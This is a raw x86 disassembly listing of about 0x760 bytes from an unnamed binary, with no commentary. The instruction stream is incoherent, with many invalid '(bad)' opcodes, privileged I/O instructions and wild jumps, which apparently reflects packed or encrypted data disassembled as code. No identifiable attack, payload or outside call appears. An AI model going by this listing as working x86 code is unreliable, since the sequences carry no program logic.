  44973f:	add    DWORD PTR [esi-0x6fa88b2f],esi
  449745:	enter  0x6f44,0xf6
  449749:	mov    ch,0xa6
  44974b:	add    cl,BYTE PTR [edx-0x539b8d2f]
  449751:	rcr    DWORD PTR [ebx+0x73],1
  449754:	mov    bh,cl
  449756:	dec    ecx
  449757:	push   esp
  449758:	ror    al,0x49
  44975b:	outs   dx,DWORD PTR ds:[esi]
  44975c:	in     al,0xc1
  44975e:	push   edi
  44975f:	add    BYTE PTR [eax-0x1a9ac24e],dh
  449765:	fidiv  WORD PTR [ebp+0x6e]
  449768:	(bad)
  44976b:	dec    esp
  44976c:	faddp  st(7),st
  44976e:	inc    edi
  44976f:	push   edi
  449770:	mov    ecx,0xfb02acb5
  449775:	shr    BYTE PTR [ebp+eiz*2+0x8],1
  449779:	ret    
  44977a:	dec    ecx
  44977b:	inc    esp
  44977c:	cmp    dh,BYTE PTR [ebp+0x89001aa]
  449782:	lock imul esp,edi,0x32
  449786:	sti    
  449787:	pop    ebx
  449788:	out    0x38,eax
  44978a:	fldenv [esi-0x2]
  44978d:	xor    dl,al
  44978f:	jmp    DWORD PTR [edi-0xa]
  449792:	or     edi,DWORD PTR [edi]
  449794:	cmc    
  449795:	aas    
  449796:	rol    DWORD PTR [edx+0x0],1
  449799:	add    BYTE PTR [eax],al
  44979b:	add    BYTE PTR [eax],al
  44979d:	nop
  44979e:	pusha  
  44979f:	cmovg  edi,DWORD PTR [ecx-0x40990997]
  4497a6:	mov    esp,ebx
  4497a8:	lods   ax,WORD PTR ds:[esi]
  4497aa:	jnp    0x4497a7
  4497ac:	push   0x1c1277a6
  4497b1:	xchg   edx,eax
  4497b2:	xchg   ebx,edi
  4497b4:	pusha  
  4497b5:	lods   al,BYTE PTR ds:[esi]
  4497b6:	xchg   edx,eax
  4497b7:	stc    
  4497b8:	pusha  
  4497b9:	mov    bh,0x6e
  4497bb:	ret    
  4497bc:	call   DWORD PTR [edi]
  4497be:	pop    ebx
  4497bf:	or     al,0x3f
  4497c1:	jne    0x449762
  4497c3:	(bad)  
  4497c4:	data16 cmp BYTE PTR [eax-0xb],0x65
  4497c9:	je     0x449783
  4497cb:	loope  0x4497cc
  4497cd:	mul    DWORD PTR [esi+0xc]
  4497d0:	aas    
  4497d1:	jne    0x449792
  4497d3:	mov    ebp,0xdeaf6d67
  4497d8:	dec    esi
  4497d9:	imul   edi,DWORD PTR [ecx-0x34a09910],0xfd927c0c
  4497e3:	out    dx,eax
  4497e4:	pop    esi
  4497e5:	cmp    esp,ebx
  4497e7:	loopne 0x449845
  4497e9:	inc    edx
  4497ea:	or     al,0xf9
  4497ec:	pusha  
  4497ed:	inc    ebx
  4497ee:	cld    
  4497ef:	retf   
  4497f0:	jmp    FWORD PTR [edi+0x2d3f0c9c]
  4497f6:	test   ecx,0xf9ef2e68
  4497fc:	outs   dx,BYTE PTR ds:[esi]
  4497fd:	cmp    al,0xb2
  4497ff:	jg     0x4497f2
  449801:	add    BYTE PTR [eax],al
  449803:	add    BYTE PTR [eax],al
  449805:	add    ah,ch
  449807:	push   ecx
  449808:	xchg   ebx,eax
  449809:	rol    DWORD PTR [ecx],cl
  44980b:	dec    eax
  44980c:	xchg   esp,eax
  44980d:	out    0x2,al
  44980f:	inc    esp
  449810:	scas   al,BYTE PTR es:[edi]
  449811:	out    0x77,eax
  449813:	mov    eax,0x4dac0372
  449818:	xchg   ecx,eax
  449819:	(bad)
  44981c:	xchg   edx,eax
  44981d:	out    0xcf,al
  44981f:	inc    esp
  449820:	push   0x96b2c6e0
  449825:	add    al,0x8c
  449827:	dec    ebp
  449828:	push   ecx
  449829:	sar    DWORD PTR [eax-0x5114a4b8],cl
  44982f:	bound  eax,QWORD PTR [ebp-0x15]
  449832:	mov    dl,0x5f
  449834:	test   DWORD PTR [ebx],0xe534b286
  44983a:	mov    bl,0x46
  44983c:	or     ch,ch
  44983e:	mov    ch,0x4e
  449840:	sub    bl,dh
  449842:	mov    DWORD PTR [eax+eax*1-0x19],0x47eb25e
  44984a:	lds    ecx,FWORD PTR [eax+0x1b]
  44984d:	leave  
  44984e:	pop    esp
  44984f:	dec    eax
  449850:	add    al,BYTE PTR [ebx*4+0x73e534b2]
  449857:	inc    esi
  449858:	add    ch,ch
  44985a:	ins    DWORD PTR es:[edi],dx
  44985b:	dec    esi
  44985c:	adc    bl,dh
  44985e:	dec    edi
  44985f:	inc    esp
  449860:	call   0xaef6e94b
  449865:	push   es
  449866:	arpl   WORD PTR [ebp-0x27],cx
  449869:	fild   WORD PTR [eax]
  44986b:	add    BYTE PTR [eax],al
  44986d:	add    BYTE PTR [eax],al
  44986f:	dec    esp
  449870:	dec    ebp
  449871:	(bad)  
  449872:	div    BYTE PTR [eax]
  449874:	dec    edi
  449875:	rcl    dl,cl
  449877:	mov    bh,0xb7
  449879:	addr16 add eax,0xd0a34d6f
  44987f:	and    cl,BYTE PTR [ebp+0xe]
  449882:	mov    ebx,0xc47451ca
  449887:	scas   al,BYTE PTR es:[edi]
  449888:	dec    ebx
  449889:	push   edi
  44988a:	xchg   edi,eax
  44988b:	jno    0x4498dd
  44988d:	pop    esp
  44988e:	mov    WORD PTR [ebx+ecx*2+0x77],gs
  449892:	xchg   BYTE PTR [ecx+0x68],ch
  449895:	push   cs
  449896:	data16 mov fs,WORD PTR [ebx+esi*2-0x72]
  44989b:	jl     0x4498e1
  44989d:	bound  eax,QWORD PTR [ebp+ebx*2+0x66887a74]
  4498a4:	inc    esp
  4498a5:	inc    ecx
  4498a6:	jmp    0x3153733e
  4498ab:	cmp    eax,0x31557753
  4498b0:	outs   dx,BYTE PTR ds:[esi]
  4498b1:	jae    0x4498fa
  4498b3:	inc    ecx
  4498b4:	push   0x62
  4498b6:	inc    esp
  4498b7:	sub    DWORD PTR [edi+0x769364e8],esi
  4498bd:	jae    0x449906
  4498bf:	pop    ecx
  4498c0:	jnp    0x449919
  4498c2:	sub    ch,BYTE PTR [edx+ecx*2]
  4498c5:	jp     0x44990c
  4498c7:	cmp    al,0x41
  4498c9:	jns    0x4498d5
  4498cb:	aad    0xb6
  4498cd:	call   0x79a726eb
  4498d2:	sbb    al,BYTE PTR [eax]
  4498d4:	add    BYTE PTR [eax],al
  4498d6:	add    BYTE PTR [eax],al
  4498d8:	add    BYTE PTR [ebx+0x76],ch
  4498db:	sbb    esi,ecx
  4498dd:	push   ecx
  4498de:	jb     0x449914
  4498e0:	icebp  
  4498e1:	inc    ebx
  4498e2:	pop    ebp
  4498e3:	or     bl,dh
  4498e5:	push   ebp
  4498e6:	inc    ecx
  4498e7:	jmp    0x2552b27f
  4498ec:	icebp  
  4498ed:	push   esp
  4498ee:	push   edx
  4498ef:	aad    0xb2
  4498f1:	pop    sp
  4498f3:	into   
  4498f4:	scas   al,BYTE PTR es:[edi]
  4498f5:	jno    0x449905
  4498f7:	into   
  4498f8:	xchg   esp,eax
  4498f9:	ja     0x44996e
  4498fb:	aad    0xc8
  4498fd:	push   ebp
  4498fe:	js     0x449900
  449900:	in     al,dx
  449901:	in     eax,0x74
  449903:	gs aam 0xef
  449906:	outs   dx,DWORD PTR ds:[esi]
  449907:	jne    0x4498e0
  449909:	(bad)  
  44990a:	call   0x3df4280e
  44990f:	ja     0x449931
  449911:	(bad)  
  449912:	imul   ebp,DWORD PTR [eax+0x2d],0xffffffd3
  449916:	pop    ebx
  449917:	imul   ebx,DWORD PTR ds:0xe70078c9,0xffffffb1
  44991e:	sub    ah,BYTE PTR [ebp+0x1f]
  449921:	jmp    0x449947
  449923:	dec    ecx
  449924:	cmp    cl,dl
  449926:	jne    0x449994
  449928:	or     eax,0xa6f5ee2
  44992d:	loope  0x449917
  44992f:	call   FWORD PTR [ecx]
  449931:	scas   eax,DWORD PTR es:[edi]
  449932:	sub    ah,BYTE PTR [ebp-0x31]
  449935:	jecxz  0x4499ac
  449937:	outs   dx,BYTE PTR ds:[esi]
  449938:	int    0xcb
  44993a:	ja     0x44998c
  44993c:	add    BYTE PTR [eax],al
  44993e:	add    BYTE PTR [eax],al
  449940:	add    bl,bl
  449942:	retf   
  449943:	imul   eax,DWORD PTR [ecx+0x39],0xffffffb2
  449947:	jb     0x44994a
  449949:	outs   dx,BYTE PTR ds:[esi]
  44994a:	aad    0x74
  44994c:	dec    ebp
  44994d:	int3   
  44994e:	enter  0x5379,0x5d
  449952:	shl    DWORD PTR [ebp+eiz*2-0x7],1
  449956:	mov    cl,0xa
  449958:	add    DWORD PTR [esi-0x6abc8b2b],ebp
  44995e:	rcr    DWORD PTR [ebx+0x73],1
  449961:	xchg   edi,eax
  449962:	shl    DWORD PTR [ecx+0x65],1
  449965:	mov    gs,WORD PTR [esi-0x4675fccb]
  44996b:	pop    ebx
  44996c:	je     0x4498fa
  44996e:	int    0x58
  449970:	popa   
  449971:	fcmovnbe st,st(0)
  449973:	jno    0x4499da
  449975:	in     eax,dx
  449976:	aam    0x5e
  449978:	jae    0x44997a
  44997a:	int3   
  44997b:	dec    edx
  44997c:	outs   dx,DWORD PTR ds:[esi]
  44997d:	nop
  44997e:	hlt    
  44997f:	or     al,0x2e
  449981:	xchg   ebx,eax
  449982:	jmp    edx
  449984:	pusha  
  449985:	xor    esp,eax
  449987:	mov    esp,0xdcfe2066
  44998c:	inc    esp
  44998d:	xor    eax,0x183cf7ed
  449992:	retf   
  449993:	or     al,0x6b
  449995:	xchg   ecx,eax
  449996:	add    al,0xc8
  449998:	imul   edx,ebp,0x2e
  44999b:	imul   DWORD PTR [ecx+ecx*8+0x17]
  44999f:	enter  0xe264,0x2e
  4499a3:	repnz imul eax,DWORD PTR [eax],0x0
  4499a7:	add    BYTE PTR [eax],al
  4499a9:	add    BYTE PTR [eax-0x12adefbb],dl
  4499af:	sub    al,0xf4
  4499b1:	jb     0x449997
  4499b3:	es jecxz 0x4499f8
  4499b6:	in     al,0x2a
  4499b8:	loop   0x449a2c
  4499ba:	aad    0x53
  4499bc:	mov    edi,0xd6a47ff
  4499c1:	aas    
  4499c2:	mov    ch,0x57
  4499c4:	rcr    DWORD PTR [esi+eiz*4+0x5e],1
  4499c8:	adc    al,BYTE PTR [eax-0x6e]
  4499cb:	jle    0x449996
  4499cd:	gs popf 
  4499cf:	sbb    dh,0x5c
  4499d2:	lods   eax,DWORD PTR ds:[esi]
  4499d3:	test   eax,esp
  4499d5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4499d7:	fwait
  4499d8:	imul   DWORD PTR [eax+0x7e]
  4499db:	xchg   edi,eax
  4499dc:	adc    dl,BYTE PTR [esi-0x6e]
  4499df:	test   dl,ah
  4499e1:	pop    esp
  4499e2:	outs   dx,BYTE PTR ds:[esi]
  4499e3:	xchg   ecx,ecx
  4499e5:	jb     0x449a52
  4499e7:	lahf   
  4499e8:	imul   DWORD PTR [edi+0x47]
  4499eb:	retf   
  4499ec:	or     al,0x60
  4499ee:	xchg   edx,eax
  4499ef:	test   dl,ah
  4499f1:	pop    esp
  4499f2:	outs   dx,BYTE PTR ds:[esi]
  4499f3:	xchg   edx,eax
  4499f4:	hlt    
  4499f5:	outs   dx,DWORD PTR ds:[esi]
  4499f6:	pop    ebp
  4499f7:	mov    edi,0xb2435ca8
  4499fc:	mov    esp,0xf7422eef
  449a01:	add    ebx,DWORD PTR [ebx]
  449a03:	mov    dl,0xbb
  449a05:	ficom  WORD PTR [ebp+0x6c]
  449a08:	(bad)
  449a0b:	dec    edi
  449a0c:	xchg   ebp,esi
  449a0e:	add    BYTE PTR [eax],al
  449a10:	add    BYTE PTR [eax],al
  449a12:	add    BYTE PTR [esi],ch
  449a14:	push   ecx
  449a15:	mov    dh,0x3
  449a17:	cli    
  449a18:	mov    cl,0xbb
  449a1a:	fidiv  WORD PTR ds:0xdfe0ab6e
  449a20:	inc    eax
  449a21:	and    ah,0xd6
  449a24:	mov    dl,0x52
  449a26:	add    bh,BYTE PTR [edi-0x1b2b74b3]
  449a2c:	push   eax
  449a2d:	mov    bl,dh
  449a2f:	cmc    
  449a30:	cmp    eax,0xb15603f7
  449a35:	test   dh,bl
  449a37:	jmp    0x449aa0
  449a39:	call   0xebf5:0x9643f1fa
  449a40:	pop    edi
  449a41:	dec    ebx
  449a42:	in     eax,0xbb
  449a44:	dec    ebp
  449a45:	test   DWORD PTR [ebx],0xe138b1a8
  449a4b:	stos   DWORD PTR es:[edi],eax
  449a4c:	gs push edx
  449a4e:	out    0xbc,al
  449a50:	imul   ebp,DWORD PTR [ebx],0x3369ace1
  449a56:	add    al,0xf5
  449a58:	mov    cl,0x38
  449a5a:	loope  0x449a07
  449a5c:	pop    esi
  449a5d:	dec    edi
  449a5e:	repnz ins BYTE PTR es:[edi],dx
  449a60:	push   ecx
  449a61:	sbb    eax,eax
  449a63:	fs aas 
  449a65:	cld    
  449a66:	out    dx,eax
  449a67:	jbe    0x449aab
  449a69:	test   DWORD PTR [ebx],0xe125b130
  449a6f:	dec    esi
  449a70:	dec    ecx
  449a71:	in     al,0xef
  449a73:	inc    esp
  449a74:	inc    eax
  449a75:	add    ch,ch
  449a77:	add    BYTE PTR [eax],al
  449a79:	add    BYTE PTR [eax],al
  449a7b:	add    BYTE PTR [ebp+0x4e],dh
  449a7e:	push   cs
  449a7f:	push   es
  449a80:	out    0x6e,eax
  449a82:	jae    0x449a7e
  449a84:	ret    0x7152
  449a87:	int3   
  449a88:	(bad)  
  449a89:	mov    bl,0xe8
  449a8b:	fs xchg edx,eax
  449a8d:	pusha  
  449a8e:	jae    0x449a5e
  449a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449a91:	inc    eax
  449a92:	(bad)  
  449a93:	les    esp,FWORD PTR [ecx-0x5d378590]
  449a99:	inc    eax
  449a9a:	push   ebx
  449a9b:	rcl    esp,0xb3
  449a9e:	call   0x5eb02c6d
  449aa3:	les    esi,FWORD PTR [ebp+0x64]
  449aa6:	ja     0x449a3f
  449aa8:	addr16 dec esp
  449aaa:	popa   
  449aab:	mov    edx,0x8062526f
  449ab0:	outs   dx,BYTE PTR ds:[esi]
  449ab1:	dec    ebp
  449ab2:	inc    ecx
  449ab3:	jmp    0x9a50524b
  449ab8:	jo     0x449b01
  449aba:	inc    edx
  449abb:	xchg   ecx,eax
  449abc:	popa   
  449abd:	push   esi
  449abe:	outs   dx,DWORD PTR ds:[esi]
  449abf:	lea    edx,[edi]
  449ac1:	push   esi
  449ac2:	pop    ebp
  449ac3:	cmp    BYTE PTR [edi],0x4c
  449ac6:	pop    esi
  449ac7:	jmp    0x2a53095f
  449acc:	sub    BYTE PTR [ebp+ebx*2+0x4c],cl
  449ad0:	push   eax
  449ad1:	push   esi
  449ad2:	pop    ebp
  449ad3:	inc    edx
  449ad4:	and    BYTE PTR [esi+ebx*2-0x17],cl
  449ad8:	xchg   ebx,eax
  449ad9:	and    BYTE PTR [edi],cl
  449adb:	xor    DWORD PTR es:[edi+0x3e],eax
  449adf:	cmp    eax,DWORD PTR [eax]
  449ae1:	add    BYTE PTR [eax],al
  449ae3:	add    BYTE PTR [eax],al
  449ae5:	das    
  449ae6:	push   eax
  449ae7:	jae    0x449b23
  449ae9:	add    esp,DWORD PTR [edi+esi*2+0x17]
  449aed:	lock dec ebx
  449aef:	popa   
  449af0:	cmp    al,BYTE PTR [eax]
  449af2:	push   edx
  449af3:	bound  eax,QWORD PTR [eax]
  449af5:	out    dx,eax
  449af6:	dec    esp
  449af7:	push   cs
  449af8:	adc    al,0x94
  449afa:	outs   dx,DWORD PTR ds:[esi]
  449afb:	pop    esp
  449afc:	add    BYTE PTR [ebp+ecx*8-0x3a799a8c],dl
  449b03:	jb     0x449b69
  449b05:	mov    es,ebx
  449b07:	cmp    esi,DWORD PTR [eax+ebx*4-0x3e]
  449b0b:	jne    0x449b7c
  449b0d:	(bad)  
  449b0f:	call   0x4df39513
  449b14:	ins    BYTE PTR es:[edi],dx
  449b15:	into   
  449b16:	mov    edi,0xccd05749
  449b1b:	inc    esp
  449b1c:	outs   dx,DWORD PTR ds:[esi]
  449b1d:	out    0xdf,al
  449b1f:	je     0x449b82
  449b21:	in     eax,0xc5
  449b23:	outs   dx,DWORD PTR ds:[esi]
  449b24:	outs   dx,BYTE PTR ds:[esi]
  449b25:	test   eax,0x2a02f5ae
  449b2a:	xchg   ebx,eax
  449b2b:	je     0x449b7d
  449b2d:	sub    ebx,DWORD PTR [ecx-0x5ae59a93]
  449b33:	pop    ecx
  449b34:	imul   ecx,DWORD PTR [edi],0x2a777192
  449b3a:	mov    ds:0x9900746f,al
  449b3f:	jb     0x449b41
  449b41:	or     BYTE PTR [esi-0x68fb8db5],dh
  449b47:	je     0x449bae
  449b49:	add    BYTE PTR [eax],al
  449b4b:	add    BYTE PTR [eax],al
  449b4d:	add    ch,dh
  449b4f:	xchg   edx,eax
  449b50:	pop    ebp
  449b51:	imul   esp,ebp,0xffffff97
  449b54:	js     0x449bad
  449b56:	sub    DWORD PTR [esi-0x6e99fe4b],esi
  449b5c:	je     0x449bb1
  449b5e:	shl    BYTE PTR [ebx+0x79bc6574],0x4b
  449b65:	je     0x449bc2
  449b67:	popf   
  449b68:	ins    DWORD PTR es:[edi],dx
  449b69:	jae    0x449b94
  449b6b:	mov    dh,0x71
  449b6d:	add    ch,BYTE PTR [ecx-0x438ba269]
  449b73:	xchg   ecx,eax
  449b74:	pop    ebp
  449b75:	jae    0x449aff
  449b77:	(bad)  
  449b78:	dec    ebx
  449b79:	push   edi
  449b7a:	nop
  449b7b:	fwait
  449b7c:	or     al,0x36
  449b7e:	xchg   edx,eax
  449b7f:	into   
  449b80:	jmp    0x449bf1
  449b82:	ds ret 0x6bdc
  449b86:	gs mov edx,0xa26d4af6
  449b8c:	(bad)  
  449b8e:	iret   
  449b8f:	les    ecx,FWORD PTR [ebx]
  449b91:	aas    
  449b92:	sub    eax,0x4360d08f
  449b97:	xchg   ebp,edx
  449b99:	gs inc eax
  449b9b:	mov    ?,eax
  449b9d:	dec    eax
  449b9e:	ds jns 0x449b94
  449ba1:	jmp    DWORD PTR [edi+0x284312b7]
  449ba7:	jp     0x449b87
  449ba9:	dec    esp
  449baa:	and    BYTE PTR [ebx-0x37],ch
  449bad:	jno    0x449b96
  449baf:	fwait
  449bb0:	or     al,0x8
  449bb2:	add    BYTE PTR [eax],al
  449bb4:	add    BYTE PTR [eax],al
  449bb6:	add    BYTE PTR [edx-0xaae209e],dl
  449bbc:	cmp    al,0xf8
  449bbe:	cmp    al,0xe5
  449bc0:	dec    ebx
  449bc1:	clc    
  449bc2:	js     0x449b54
  449bc4:	dec    edx
  449bc5:	push   cs
  449bc6:	push   eax
  449bc7:	loop   0x449c0b
  449bc9:	repnz imul eax,edi,0x42
  449bcd:	repnz pop ebx
  449bcf:	out    0x30,eax
  449bd1:	or     al,0x1
  449bd3:	xchg   ecx,eax
  449bd4:	push   esi
  449bd5:	(bad)  [ecx+esi*4+0x7]
  449bd9:	mov    ebp,0x1307b35c
  449bde:	cs xchg ecx,eax
  449be0:	loopne 0x449ba9
  449be2:	imul   edx,esp,0xffffffdc
  449be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449be6:	ja     0x449b78
  449be8:	xchg   BYTE PTR ds:0xc7e7ae49,cl
  449bee:	jno    0x449b93
  449bf0:	(bad)  
  449bf1:	in     eax,dx
  449bf2:	imul   esp,DWORD PTR [edx-0xa],0xffffffed
  449bf6:	imul   edx,DWORD PTR [eax-0x40fdbb4e],0x17
  449bfd:	add    cl,bh
  449bff:	addr16 push ss
  449c01:	pop    ss
  449c02:	lock dec esp
  449c04:	add    al,0x13
  449c06:	loope  0x449c83
  449c08:	mov    dl,0xdf
  449c0a:	add    edx,DWORD PTR [edx+0x17]
  449c0d:	adc    ebx,ebp
  449c0f:	ins    DWORD PTR es:[edi],dx
  449c10:	add    dl,BYTE PTR [edi]
  449c12:	jmp    0x449c49
  449c14:	test   BYTE PTR es:[ebx],0xda
  449c18:	mov    cl,0xb9
  449c1a:	icebp  
  449c1b:	add    BYTE PTR [eax],al
  449c1d:	add    BYTE PTR [eax],al
  449c1f:	add    BYTE PTR [eax],dh
  449c21:	sub    DWORD PTR [ebx-0x9e8a921],esi
  449c27:	add    edx,edx
  449c29:	mov    dl,0xb0
  449c2b:	fidivr WORD PTR [ebx]
  449c2d:	or     DWORD PTR [edi-0x5edec41b],edi
  449c33:	retf   0x182d
  449c36:	rol    DWORD PTR [ebx],1
  449c38:	mov    ?,WORD PTR [ebx+0x1ef3eaaf]
  449c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449c3f:	fdivrp st(2),st
  449c41:	test   BYTE PTR es:[ebx],0x3f
  449c45:	mov    dl,0xb8
  449c47:	fdivp  st(3),st
  449c49:	pop    es
  449c4a:	(bad)  
  449c4b:	in     eax,0xcb
  449c4d:	pop    ds
  449c4e:	imul   edi,DWORD PTR [edi+0x264b2d2],0xc66a1597
  449c58:	in     al,dx
  449c59:	and    esp,DWORD PTR [ebp-0x1e]
  449c5c:	out    0x15,al
  449c5e:	sub    DWORD PTR [esp+ebp*8],eax
  449c61:	mov    cl,0x30
  449c63:	jmp    0xe88aa213
  449c68:	mov    al,0x26
  449c6a:	push   ebx
  449c6b:	(bad)  
  449c6c:	(bad)  
  449c6d:	and    dh,dh
  449c6f:	add    ebp,DWORD PTR [edx]
  449c71:	mov    bl,0x32
  449c73:	loop   0x449c30
  449c75:	add    cl,BYTE PTR [edi]
  449c77:	dec    eax
  449c78:	in     eax,dx
  449c79:	adc    eax,0xd893e963
  449c7e:	push   cs
  449c7f:	sub    bl,ah
  449c81:	adc    bl,BYTE PTR [ebp+0x2d]
  449c84:	add    BYTE PTR [eax],al
  449c86:	add    BYTE PTR [eax],al
  449c88:	add    bl,dh
  449c8a:	and    BYTE PTR [edx+0x1b],dh
  449c8d:	retf   
  449c8e:	scas   eax,DWORD PTR es:[edi]
  449c8f:	call   0x723429ac
  449c94:	std    
  449c95:	ror    BYTE PTR [esi],1
  449c97:	pop    esp
  449c98:	cli    
  449c99:	in     al,dx
  449c9a:	adc    BYTE PTR [edx+0x19],dh
  449c9d:	mov    bl,0x24
  449c9f:	cmovs  ecx,DWORD PTR [esi-0x572a8dfc]
  449ca6:	adc    bl,BYTE PTR [esp+eax*8-0x32]
  449caa:	adc    bl,BYTE PTR [edi-0x23]
  449cad:	test   al,0x21
  449caf:	jb     0x449c9a
  449cb1:	xchg   ebx,eax
  449cb2:	fimul  WORD PTR ds:0x4c1ba8ae
  449cb8:	mov    ah,0x9d
  449cba:	and    al,0x78
  449cbc:	mov    ebx,0xe95c1863
  449cc1:	xchg   ebx,eax
  449cc2:	sbb    DWORD PTR ds:0x740e68b9,ecx
  449cc8:	lods   al,BYTE PTR ds:[esi]
  449cc9:	push   0x7a885c24
  449cce:	push   cs
  449ccf:	dec    esi
  449cd0:	jmp    0x9951b968
  449cd5:	push   0x68ac740e
  449cda:	and    al,0x5c
  449cdc:	mov    BYTE PTR [edx],bh
  449cde:	push   cs
  449cdf:	inc    eax
  449ce0:	jmp    0x3a521778
  449ce5:	sub    DWORD PTR [ebx],ebx
  449ce7:	dec    esp
  449ce8:	push   esp
  449ce9:	ds and al,0x78
  449cec:	pop    ebx
  449ced:	add    BYTE PTR [eax],al
  449cef:	add    BYTE PTR [eax],al
  449cf1:	add    BYTE PTR [eax+ebx*1+0x5c],al
  449cf5:	jmp    0x52698d
  449cfa:	outs   dx,BYTE PTR ds:[esi]
  449cfb:	cdq    
  449cfc:	je     0x449d41
  449cfe:	enter  0x74a6,0x75
  449d02:	retf   
  449d03:	cdq    
  449d04:	call   0x3bfa1208
  449d09:	gs popf 
  449d0b:	ja     0x449d7c
  449d0d:	jo     0x449cac
  449d0f:	test   eax,0xb2f9655e
  449d14:	outs   dx,DWORD PTR ds:[esi]
  449d15:	add    DWORD PTR [esi-0x73b28b67],ebp
  449d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449d1c:	pop    ebp
  449d1d:	popa   
  449d1e:	mov    ds,WORD PTR [ecx-0x4cfeffb1]
  449d24:	dec    ebx
  449d25:	push   0x6f54a898
  449d2a:	push   es
  449d2b:	call   0x155:0xb2a95773
  449d32:	(bad)  
  449d33:	cdq    
  449d34:	je     0x449d7f
  449d36:	ficom  DWORD PTR [ebx-0x6738b68e]
  449d3c:	jno    0x449d3e
  449d3e:	addr16 mov bl,0x2a
  449d41:	jb     0x449d9b
  449d43:	test   eax,0x94466357
  449d48:	call   0x2af67d4c
  449d4d:	imul   ebx,DWORD PTR [edx],0x1a746fa2
  449d53:	mov    dl,BYTE PTR [ebx+0x65]
  449d56:	add    BYTE PTR [eax],al
  449d58:	add    BYTE PTR [eax],al
  449d5a:	add    BYTE PTR [edx],cl
  449d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449d5d:	outs   dx,DWORD PTR ds:[esi]
  449d5e:	addr16 or al,0x89
  449d61:	call   0x51fc9965
  449d66:	jae    0x449d86
  449d68:	mov    DWORD PTR [edi+0x69],ebp
  449d6b:	mov    ebp,0x8472717b
  449d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449d71:	ins    BYTE PTR es:[edi],dx
  449d72:	je     0x449d54
  449d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449d75:	ins    BYTE PTR es:[edi],dx
  449d76:	gs nop
  449d78:	aam    0xf0
  449d7a:	imul   ebp,DWORD PTR [ebp-0x6f8d1908],0x983d0d9e
  449d84:	add    ah,bh
  449d86:	dec    esi
  449d87:	jns    0x449d7e
  449d89:	mul    BYTE PTR [esi+0x7f]
  449d8c:	call   0x94d51560
  449d91:	adc    al,BYTE PTR [ebp+0x71]
  449d94:	retf   
  449d95:	lds    ebp,FWORD PTR [eax+0x7e]
  449d98:	mov    edi,0xac406eed
  449d9d:	lds    esp,FWORD PTR [ebp+0x64]
  449da0:	test   al,0xc
  449da2:	adc    BYTE PTR [edx+0x394ee1e2],dl
  449da8:	mov    ch,0xf6
  449daa:	data16 aas 
  449dac:	fwait
  449dad:	or     al,0xb
  449daf:	xchg   ebx,eax
  449db0:	push   0x825f6bf1
  449db5:	out    dx,al
  449db6:	pop    ebx
  449db7:	aas    
  449db8:	mov    WORD PTR [esi+eiz*2+0xc0c9b23],?
  449dbf:	add    BYTE PTR [eax],al
  449dc1:	add    BYTE PTR [eax],al
  449dc3:	add    BYTE PTR [ecx+0x516bf15c],dl
  449dc9:	jge    0x449dbe
  449dcb:	pop    esp
  449dcc:	add    esi,DWORD PTR [eax-0x11]
  449dcf:	jno    0x449d61
  449dd1:	mov    ecx,0x4ff53f0b
  449dd6:	shl    DWORD PTR [ebx-0xf],cl
  449dd9:	dec    eax
  449dda:	jecxz  0x449e1f
  449ddc:	push   DWORD PTR ds:0x41904ef7
  449de2:	or     eax,0xbc2ff53f
  449de7:	pusha  
  449de8:	loop   0x449e20
  449dea:	out    dx,al
  449deb:	imul   edx,DWORD PTR [eax-0x52c0f42f],0x27
  449df2:	(bad)  
  449df3:	push   0xe159b2ae
  449df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449df9:	add    BYTE PTR [ebx-0x1b],dl
  449dfc:	mov    ebx,0x64d52ab2
  449e01:	add    BYTE PTR ds:0x42167636,al
  449e07:	loopne 0x449e20
  449e09:	lods   eax,DWORD PTR ds:[esi]
  449e0a:	add    BYTE PTR [ebx],0x53
  449e0d:	and    BYTE PTR [edi],bl
  449e0f:	hlt    
  449e10:	jnp    0x449e07
  449e12:	push   edx
  449e13:	clc    
  449e14:	push   edi
  449e15:	adc    eax,DWORD PTR ds:0x41347dc
  449e1b:	jecxz  0x449e91
  449e1d:	mov    dl,0xb6
  449e1f:	add    edx,DWORD PTR [ebx+0x20]
  449e22:	push   ebx
  449e24:	imul   esi,ebx,0x14
  449e27:	repz add BYTE PTR [eax],al
  449e2a:	add    BYTE PTR [eax],al
  449e2c:	add    BYTE PTR [ebx+ebx*1-0x1c],ah
  449e30:	out    0x52,al
  449e32:	sbb    eax,0x2a64f810
  449e37:	loop   0x449e11
  449e39:	mov    edi,0x53034dac
  449e3e:	and    bh,ch
  449e40:	repz cmp eax,DWORD PTR [eax]
  449e43:	fcmovnu st,st(7)
  449e45:	inc    esp
  449e46:	adc    eax,ebp
  449e48:	out    0x52,al
  449e4a:	sbb    eax,0x2a34f7c0
  449e4f:	mov    ds:0xb4b35303,al
  449e54:	cmc    
  449e55:	or     BYTE PTR [ebx],ah
  449e57:	mov    ds:0x971601c4,al
  449e5c:	not    esp
  449e5e:	cli    
  449e5f:	xchg   esi,eax
  449e60:	hlt    
  449e61:	div    DWORD PTR [edx+0x20d30337]
  449e67:	jg     0x449e5c
  449e69:	jmp    0x449e61
  449e6b:	call   0xd7ea:0x9920ebf4
  449e72:	adc    DWORD PTR [edi],ecx
  449e74:	jp     0x449ee1
  449e76:	lods   al,BYTE PTR ds:[esi]
  449e77:	call   0x5d34318d
  449e7c:	pusha  
  449e7d:	cmp    al,0x18
  449e7f:	push   edi
  449e80:	dec    eax
  449e81:	and    edx,DWORD PTR [ebx+edx*2]
  449e84:	dec    eax
  449e85:	sub    BYTE PTR [ebx],dl
  449e87:	(bad)  
  449e89:	xchg   ebp,eax
  449e8a:	jmp    0x449efd
  449e8c:	cmp    eax,0x44741538
  449e91:	add    BYTE PTR [eax],al
  449e93:	add    BYTE PTR [eax],al
  449e95:	add    dh,ch
  449e97:	cli    
  449e98:	js     0x449ee9
  449e9a:	out    0x21,eax
  449e9c:	jp     0x449ee6
  449e9e:	clc    
  449e9f:	sbb    bh,BYTE PTR [eax+0x17]
  449ea2:	mov    WORD PTR ds:0x1ace300e,?
